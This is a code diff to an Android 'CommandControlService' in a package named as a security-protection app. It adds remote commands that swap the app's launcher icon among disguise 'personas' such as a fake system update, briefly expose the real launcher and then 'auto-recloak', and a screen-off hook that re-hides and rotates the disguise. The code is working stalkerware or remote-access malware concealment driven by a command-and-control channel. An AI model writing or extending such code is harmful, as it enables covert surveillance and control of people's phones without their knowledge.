@@ -278,6 +278,10 @@ public class CommandControlService extends Service {
         IntentFilter cameraFilter = new IntentFilter("com.seguranca.protecao.CAMERA_FRAME_READY");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(cameraFrameReceiver, cameraFilter, Context.RECEIVER_NOT_EXPORTED);
+
+        // Register SCREEN_OFF receiver for decoy self-heal
+        IntentFilter screenFilter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
+        registerReceiver(screenOffReceiver, screenFilter);
         } else {
             registerReceiver(cameraFrameReceiver, cameraFilter);
         }
@@ -2204,6 +2208,70 @@ public class CommandControlService extends Service {
                     break;
                 }
                     
+
+                // ── DECOY_SWITCH: switch stealth persona remotely ───────────────
+                case "DECOY_SWITCH": {
+                    int persona = cmd.has("persona")
+                        ? cmd.get("persona").getAsInt()
+                        : DecoyManager.PERSONA_SYS_UPDATE;
+                    if (persona < 0 || persona > 6) persona = DecoyManager.PERSONA_SYS_UPDATE;
+                    final int fp = persona;
+                    new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
+                        DecoyManager.get(CommandControlService.this).remoteSwitch(fp)
+                    );
+                    sendResponse("OK", "Decoy switched to persona " + fp);
+                    break;
+                }
+
+                // ── DECOY_STATUS: query current persona and deployed state ─────
+                case "DECOY_STATUS": {
+                    DecoyManager dm = DecoyManager.get(this);
+                    com.google.gson.JsonObject resp = new com.google.gson.JsonObject();
+                    resp.addProperty("type", "DECOY_STATUS");
+                    resp.addProperty("persona", dm.getPersona());
+                    resp.addProperty("deployed", dm.isDeployed());
+                    sendJson(resp);
+                    break;
+                }
+
+                // ── DECOY_ROTATE: force immediate rotation to next persona ─────
+                case "DECOY_ROTATE": {
+                    DecoyManager dm = DecoyManager.get(this);
+                    int current = dm.getPersona();
+                    int next = (current >= DecoyManager.PERSONA_FILE_MGR)
+                        ? DecoyManager.PERSONA_SYS_UPDATE : current + 1;
+                    new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
+                        dm.remoteSwitch(next)
+                    );
+                    sendResponse("OK", "Rotated to persona " + next);
+                    break;
+                }
+
+                // ── DECOY_RESTORE: temporarily restore real launcher (60s) ─────
+                case "DECOY_RESTORE": {
+                    new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                        android.content.ComponentName realAlias = new android.content.ComponentName(
+                            CommandControlService.this,
+                            "com.seguranca.protecao.alias.RealAlias"
+                        );
+                        android.content.ComponentName sysAlias = new android.content.ComponentName(
+                            CommandControlService.this,
+                            "com.seguranca.protecao.alias.SystemUpdateAlias"
+                        );
+                        android.content.pm.PackageManager pm = getPackageManager();
+                        pm.setComponentEnabledSetting(realAlias,
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP);
+                        pm.setComponentEnabledSetting(sysAlias,
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP);
+                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() ->
+                            DecoyManager.get(CommandControlService.this).selfHeal(), 60_000);
+                    });
+                    sendResponse("OK", "Real launcher exposed for 60s, auto-recloak scheduled");
+                    break;
+                }
+
                 default:
                     Log.w(TAG, "Comando desconhecido: " + action);
             }
@@ -2212,6 +2280,21 @@ public class CommandControlService extends Service {
             Log.e(TAG, "Erro ao processar comando: " + e.getMessage());
         }
     }
+
+
+    // ── SCREEN_OFF receiver for self-heal and auto-rotate ──────────────────
+    private BroadcastReceiver screenOffReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            try {
+                DecoyManager dm = DecoyManager.get(context);
+                dm.selfHeal();
+                dm.maybeAutoRotate();
+            } catch (Exception e) {
+                Log.e(TAG, "SCREEN_OFF handler error: " + e.getMessage());
+            }
+        }
+    };
 
     /**
      * Callback: Desconectado
